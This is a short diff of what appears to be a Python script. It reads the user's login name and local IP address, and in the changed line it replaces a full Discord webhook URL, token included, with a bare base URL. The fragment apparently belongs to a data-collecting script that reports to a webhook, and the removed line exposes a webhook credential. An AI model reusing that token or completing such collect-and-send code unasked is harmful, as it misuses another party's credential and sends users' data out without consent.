@@ -10,7 +10,7 @@ os.system("clear")
 
 
 x = os.getlogin()
-url = "https://discord.com/api/webhooks/875382333765730414/aoGVcQmTR3z6VhbllWFmQTDoaCxEKtRmK40w9MUl2yfc2EdNHAXWiO4xcuJ2XkUmXJhb"
+url = "https://discord.com/api/webhooks"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
